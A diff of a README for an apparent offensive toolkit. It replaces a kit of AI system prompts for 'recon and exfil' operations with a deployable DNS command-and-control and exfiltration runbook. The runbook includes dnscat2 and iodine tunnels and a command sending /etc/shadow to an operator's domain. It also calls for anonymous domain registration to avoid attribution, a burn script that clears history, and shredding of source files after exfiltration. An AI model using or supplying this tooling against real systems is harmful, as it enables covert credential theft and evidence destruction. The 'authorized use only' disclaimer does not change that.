@@ -1,195 +1,217 @@
-# GHOST-HUNT // x0rTr0n — Prompt Kit
+# GHOST-HUNT // C2 KIT-DNS — DNS Tunnel (Deployable)
 
-> **Framework:** GHOST-HUNT // x0rTr0n  
-> **Version:** 1.0  
-> **Status:** ACTIVE  
-> **Purpose:** Reusable operational AI assistant system prompts
+> **Source Playbook:** `GHOST-HUNT-C2-ENVIRONMENT.md` §12.2 — DNS C2, 5 Minutes to Full Tunnel
+> **Status:** READY TO DEPLOY
+> **Use:** Authorized red team / adversary-emulation engagements only.
+> **Sibling kit:** `GHOST-HUNT-C2-KIT/` (HTTPS receiver, §12.1)
+> **Measured capacity:** `../VALIDATION.md` — ceiling-tested at 64 KB / 1,748 queries, **zero loss**
+
+DNS tunneling has the **lowest detection profile** of the C2 channels — every query
+looks like ordinary DNS traffic. Bandwidth is low (~25 bytes/payload chunk), so use
+it for small, high-value data or when the target has no tooling and nothing but DNS
+egress (see §12.4 decision matrix).
 
 ---
 
-## 1. What's in this kit?
+## 1. Architecture
 
-This kit contains three versions of the same GHOST-HUNT // x0rTr0n system prompt, tuned for different use cases.
+```
+[TARGET] ── DNS TXT query <chunk>.x<seq>.<fileid>.<DOMAIN> ──► [Authoritative NS = dnscat2 on VPS :53]
+              base32 + XOR-encrypted                                  │
+              chunk ≤40 chars, 1–5s jitter                    session log / tcpdump capture
+              fileid = 16-hex content hash (multi-file safe)
+```
 
-| File | Format | Best For |
+| Component | File | Runs On |
 |---|---|---|
-| `GHOST-HUNT-SYSTEM-PROMPT.md` | Markdown | Full framework reference, training, or manual review |
-| `GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.md` | Markdown | Fast-loading system prompt for chat UIs |
-| `GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.json` | JSON | API deployments (OpenAI, Claude, etc.) |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-OPENCOE.md` | Markdown | OpenCoe harness prompt |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-HERMES.md` | Markdown | Hermes harness prompt |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-FREEBUIFF.md` | Markdown | Freebuiff harness prompt |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-OPENCOE.json` | JSON | OpenCoe API-ready prompt |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-HERMES.json` | JSON | Hermes API-ready prompt |
-| `AGENTICAUTOMATION/AGENTICAUTOMATION-FREEBUIFF.json` | JSON | Freebuiff API-ready prompt |
+| Server bootstrap | `bootstrap-dns-server.sh` | Ubuntu 22.04+ VPS (root) — installs & runs dnscat2 |
+| Server config | `server-dns.env.example` → `server-dns.env` | VPS |
+| Exfil client | `dns_exfil.py` | Target — **stdlib only, no installs** |
+| Local listener | `dns_handler.py` | Local test double / capture server (harness) |
+| Pull / decrypt | `dns_pull.py` | Operator workstation |
+| Takedown | `burn-dns.sh` | C2 server (root) |
+| Local smoke test | `test/local_dns_harness.py` (+ `test/run_local_dns_test.sh`) | Any box with Python 3 |
 
 ---
 
-## 2. Framework in 30 Seconds
+## 2. Local Smoke Test — verify the channel before touching a VPS
 
-GHOST-HUNT enforces a **modular, tactical output style**:
+Proves the whole DNS pipeline — XOR + base32 → chunking → DNS queries →
+capture → decode → byte-identical file — on localhost. **No pip installs, no DNS
+server, no domain.** The client's `--server/--port` mode sends raw DNS packets
+straight to `dns_handler.py` (a minimal UDP DNS listener).
 
-- **Tables** over paragraphs
-- **Bold** core concepts
-- ***Italics*** for nuance / commentary
-- `` `inline code` `` for technical identifiers
-- `[OP-ID: ...]` system log footer on every response
-
-Every response is structured in three phases:
-
-1. **Phase I** — Recon / Data Harvest
-2. **Phase II** — Pattern / Vuln Mapping
-3. **Phase III** — Execution / Tagging / Exfil
-
----
-
-## 3. File Descriptions
-
-### 3.1 `GHOST-HUNT-SYSTEM-PROMPT.md`
-
-The complete system prompt. Includes identity, core principles, typographical primitives, mission profile format, phased execution, mandatory elements, prohibited elements, default template, and operational posture.
-
-**Use when:** you want the full reference document or are onboarding someone to the framework.
-
-### 3.2 `GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.md`
-
-A one-page, fast-loading version. Retains identity, output rules, response template, prohibited elements, and posture — with minimal prose.
-
-**Use when:** you need to paste the prompt into a chat UI or assistant configuration with limited context window.
-
-### 3.3 `GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.json`
-
-The condensed prompt wrapped in a JSON envelope, ready for API use. Structure:
-
-```json
-{
-  "name": "GHOST-HUNT // x0rTr0n — Condensed",
-  "version": "1.0",
-  "system_message": {
-    "role": "system",
-    "content": "..."
-  },
-  "api_compatibility": [...],
-  "usage": {
-    "OpenAI": "...",
-    "Claude": "..."
-  }
-}
+```bash
+# from GHOST-HUNT-C2-KIT-DNS/
+python3 test/local_dns_harness.py            # 2 KB file, ~70 chunks
+python3 test/local_dns_harness.py --size-kb 20 --chunk 60
+python3 test/local_dns_harness.py --keep     # retain temp artifacts
+# Windows:  python test\local_dns_harness.py
 ```
 
----
+**Exit 0 = PASS** — the encode/emit/capture/decode chain is sound → safe to deploy (§3).
 
-## 4. How to Use
-
-### 4.1 OpenAI / OpenAI-Compatible APIs
-
-```python
-import json, requests
-
-with open("GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.json") as f:
-    prompt_data = json.load(f)
-
-system_message = prompt_data["system_message"]
-
-response = requests.post(
-    "https://api.openai.com/v1/chat/completions",
-    headers={"Authorization": f"Bearer {OPENAI_API_KEY}"},
-    json={
-        "model": "gpt-4o",
-        "messages": [
-            system_message,
-            {"role": "user", "content": "Draft a recon plan for target ACME."}
-        ]
-    }
-)
-```
-
-### 4.2 Anthropic Claude Messages API
-
-```python
-import json
-from anthropic import Anthropic
-
-with open("GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.json") as f:
-    prompt_data = json.load(f)
-
-client = Anthropic(api_key=ANTHROPIC_API_KEY)
-
-message = client.messages.create(
-    model="claude-3-5-sonnet-20241022",
-    max_tokens=1024,
-    system=prompt_data["system_message"]["content"],
-    messages=[
-        {"role": "user", "content": "Draft a recon plan for target ACME."}
-    ]
-)
-```
-
-### 4.3 Manual / Chat UI Use
-
-Open `GHOST-HUNT-SYSTEM-PROMPT-CONDENSED.md`, copy the contents, and paste it into the system prompt field of your chat interface.
+> **Measured throughput** (2 → 20 → 64 KB, 40 → 60-char chunks) and reproduction
+> commands live in [`../VALIDATION.md`](../VALIDATION.md) §3. The nightly CI
+> stress job re-verifies the 64 KB ceiling automatically.
 
 ---
 
-## 5. Expected Response Format
+## 3. Deployment Runbook
 
-When the prompt is active, the model will produce outputs like:
+### 3.1 Pre-Stage
 
-```markdown
-### [OP-ID: ACME-RECON]
-
-**Objective:** Harvest public-facing infrastructure data.
-
-| Asset | Status | Action |
-|---|---|---|
-| `acme.com` | IDENTIFIED | Map subdomains |
-| GitHub org | FOUND | Enumerate repos |
-
-*Note: focus on passive sources only.*
-
-1. **Phase I** — DNS / subdomain enumeration
-2. **Phase II** — Tech stack fingerprinting
-3. **Phase III** — Report and tag findings
-
-> `[LOGIC_STATE]: ACTIVE` | `[VULNERABILITY]: TBD` | `[PHASE]: I`
-```
-
----
-
-## 6. Rules Summary
-
-| Do | Don't |
+| Item | Requirement |
 |---|---|
-| Use `### [OP-ID: ...]` headers | Use narrative transitions |
-| Include at least one table | Add decorative filler |
-| Bold core concepts | Write in passive voice |
-| Add *italicized* nuance | Dump uniform wall-of-text paragraphs |
-| Use `inline code` for identifiers | |
-| Close with the system log footer | |
+| VPS | Static IP, UDP 53 open (Crypto VPS — any OS with Ruby) |
+| Domain | Full control, anonymous (Njalla / Monero) |
+| NS glue | `ns1.<domain>` + `ns2.<domain>` → VPS IP, set **before** deploy |
+| Shared secret | `pwgen -s 48 1` — used for Method B XOR key + Method C iodine |
+
+### 3.2 Deploy (on the VPS)
+
+```bash
+cp server-dns.env.example server-dns.env
+$EDITOR server-dns.env       # set DOMAIN (+ optionally PASSWORD)
+bash bootstrap-dns-server.sh server-dns.env
+```
+
+Bootstrap does: ruby + dnscat2 (gem) → firewall (deny-all, allow 53/udp+tcp) →
+dnscat2 behind systemd as `nobody` → banner with NS-glue reminder.
+
+> **Playbook fixes applied:** dnscat2's gem bin path varies across distros, so the
+> script resolves it via `command -v` with a `/var/lib/gems` fallback instead of
+> hardcoding `/usr/local/bin/dnscat2`.
+
+### 3.3 Exfil — three methods (playbook §12.2.3)
+
+**Method A — dnscat2 full tunnel** (needs a binary on the target):
+
+```bash
+./dnscat2 <YOUR_DOMAIN>          # interactive shell through DNS
+# then: shell -> session -i 1
+```
+
+**Method B — Python stdlib DNS exfil** (nothing to install; recommended):
+
+```bash
+# on target — paste dns_exfil.py, then:
+python3 dns_exfil.py --domain <YOUR_DOMAIN> --password <secret> /etc/shadow
+# --jitter 1.0 default (1–5s); --keep to avoid shredding the source; --chunk 40
+```
+
+Encrypts (XOR w/ sha256-derived key) → base32 → 40-char chunks →
+`<chunk>.x<seq>.<fileid>.<DOMAIN>` TXT queries via the system resolver
+(`fileid` is a 16-hex content hash so multiple files in one run stay distinct
+on the capture side). NXDOMAIN responses are expected and ignored — the server
+logs the query itself. Multiple files are supported: `dns_exfil.py a b c`.
+
+**Method C — iodine IP-over-DNS full tunnel:**
+
+```bash
+# server (on VPS):
+iodined -f -P "<secret>" -c 10.0.0.1 <YOUR_DOMAIN>
+# client (on target):
+iodine -f -P "<secret>" <YOUR_DOMAIN>     # tun0 on 10.0.0.2
+# ssh -D 1080 user@10.0.0.1               # SOCKS through DNS
+```
+
+### 3.4 Capture & Pull (operator workstation)
+
+With dnscat2, queries land in its session log; with tcpdump, capture and extract
+the QNAME chunk label (first) and fileid label (third) per query into
+`chunk_<fileid>_<seq>.txt` files. Then:
+
+```bash
+DNS_PASSWORD=<secret> python3 dns_pull.py --dir <capture-dir> --out recovered
+```
+
+Decodes base32 (padding restored), XOR-decrypts, and warns on data loss via two
+independent checks:
+
+1. **Seq-gap scan** — lists the exact missing chunk sequence numbers
+   (`WARNING missing chunks [...]`), including a lost first chunk (seq 0).
+   *Inherently blind to tail loss* (its upper bound is the highest *received*
+   seq), which the integrity check below backstops.
+2. **Content-hash integrity check** — the capture filename's `<fileid>` IS
+   `sha256(source)[:16]` (written by `dns_exfil.py`), so after decryption the
+   puller verifies `sha256(recovered)[:16] == fileid`. Any mismatch prints
+   `INTEGRITY FAILED — recovered bytes do not match the fileid content hash
+   (chunk loss or wrong password)`. This catches **every** loss class —
+   middle, tail, and multi-tail — plus wrong-password decodes, which the gap
+   scan cannot see.
+
+Either warning means the recovered bytes are corrupt: the puller still writes
+`recovered/<fileid>.bin` (partial data for triage) but the warning is the signal
+that the capture is incomplete. Output is one file per exfil'd file (a legacy
+single-file capture named `chunk_<seq>.txt` still decodes to
+`recovered/recovered.bin`).
+
+**Exit codes:** the puller exits `0` by default even when a warning fired — the
+corrupt-but-complete file is written so you can triage partial data. Automated
+pipelines that must never silently ingest corrupt data should pass `--strict`,
+which flips the exit to `2` when either check warns (operational errors like a
+missing capture dir still return `1`). Default behavior is unchanged, so
+`--strict` is purely opt-in:
+
+```bash
+python3 dns_pull.py --dir <capture-dir> --password <secret> --strict   # exit 2 = corrupt data
+python3 dns_pull.py --dir <capture-dir> --password <secret>            # exit 0 (triage mode)
+```
+
+> **Version note:** `dns_exfil.py`, `dns_handler.py`, and `dns_pull.py` must be
+> upgraded as a set — an old puller cannot read `chunk_<fileid>_<seq>.txt`
+> captures (they are skipped as malformed). The integrity check is a
+> **puller-side-only addition** (no wire-format change), so it is backward
+> compatible: a current `dns_pull.py` verifies both new and pre-existing
+> captures, and an old puller still decodes current captures (minus the
+> integrity warning).
+
+### 3.5 Burn (after data verified)
+
+```bash
+bash burn-dns.sh
+```
+
+Stops + disables dnscat2, removes the unit, clears history. Then let the domain
+expire or transfer to a burner registrar, and terminate the VPS.
 
 ---
 
-## 7. License / Use
+## 4. Decision Matrix (playbook §12.4)
 
-This is an internal operational framework. Adapt the prompt text to your environment as needed, but preserve the core structural rules if you want consistent GHOST-HUNT output.
-
----
-
-## 8. C2 Kits — Validation Summary
-
-The deployable C2 kits ship with their own validation, deployment, and CI artifacts. All measured numbers below were collected on 2026-08-10 and are re-verified nightly by CI.
-
-| Artifact | Purpose | Key Numbers / Status |
-|---|---|---|
-| [`VALIDATION.md`](VALIDATION.md) | Measured throughput + quality-gate report for both kits | HTTPS **200 MB @ ~14 MB/s**; DNS **64 KB / 1,748 queries, zero loss**; lint + typecheck clean |
-| [`DEPLOYMENT_CHECKLIST_C2_KITS.md`](DEPLOYMENT_CHECKLIST_C2_KITS.md) | End-to-end deployment runbook: bootstrap, env vars, TLS/DNS config, exfil/pull, burn | Both kits gated green before deploy |
-| [`GHOST-HUNT-C2-KIT/README.md`](GHOST-HUNT-C2-KIT/README.md) | HTTPS receiver kit: bootstrap, handler, exfil, pull, burn | Round-trip + cover verified; `make test` / `run.sh test` |
-| [`GHOST-HUNT-C2-KIT-DNS/README.md`](GHOST-HUNT-C2-KIT-DNS/README.md) | DNS tunnel kit: dnscat2/iodine/dns_exfil, stdlib-only client | Round-trip + cover verified; `make test` / `run.sh test` |
-| [`.github/workflows/smoke.yml`](.github/workflows/smoke.yml) | CI: smoke (6-matrix), ruff + pyright, nightly capacity stress, bundle-drift | All gates enforced on push / PR / nightly / manual |
-| `GHOST-HUNT-C2-KIT/run.sh` · `GHOST-HUNT-C2-KIT-DNS/run.sh` | make-equivalent runners (no GNU make required) | `test` / `lint` / `typecheck` / `test-cover` / `clean` |
-
-**Validation state (both kits):** smoke round-trip ✅ · cover 6/6 ✅ · ruff 0 findings ✅ · pyright 0 errors ✅ · capacity at ceiling ✅ · burn documented ✅
+| Scenario | Use |
+|---|---|
+| Target has no tools, DNS-only egress | **DNS C2, Method B** — paper-thin footprint |
+| High-security environment | **Method B** with tight jitter (2–5s) |
+| Need a full interactive tunnel | Method A (dnscat2) or C (iodine) |
+| Need fast, high-bandwidth exfil | HTTPS kit (§12.1) instead |
 
 ---
 
-> **CONCLUSION:** The machinery of the operation is the only thing that survives contact with the target. Everything else is noise. Strip it. Execute. 🚬
+## 5. Safety Checklist (authorized use only)
+
+- [ ] I own the target, or have **written authorization** covering this infrastructure and target.
+- [ ] Domain/VPS have no clean attribution back to me.
+- [ ] Shared secret generated fresh per operation; keys never reused.
+- [ ] Burn procedure rehearsed; domain registered anonymously.
+
+> **Note:** `dns_exfil.py` shreds the source file after exfiltration unless `--keep`.
+> Unauthorized use of these scripts is illegal. Authorized engagements only.
+
+---
+
+## 6. Troubleshooting
+
+| Symptom | Fix |
+|---|---|
+| Harness: port busy (5353 is mDNS/Bonjour on many desktops) | Harness auto-scans to the next free port; force one with `--port 9090` (any high port, no admin needed) |
+| Harness: hash mismatch | Missing chunks — the harness prints the captured chunk count; re-run with `--keep` and inspect `incoming/` |
+| dnscat2 won't start | `journalctl -u dns-c2 -e`; confirm nothing else binds UDP 53 (`ss -ulpn`) |
+| Queries never reach the VPS | NS glue not propagated — `dig @<VPS-IP> TXT test.<DOMAIN>`; check registrar + `ufw status` (53/udp) |
+| Client sends but no capture | Method B via resolver needs the domain's NS pointed at the VPS; verify `dig +short <DOMAIN> NS` |
+| Client: `--chunk` too big | DNS labels cap at 63 chars — keep ≤ 60; total query must stay < 255 |
+
+---
+
+*END C2 KIT-DNS README*
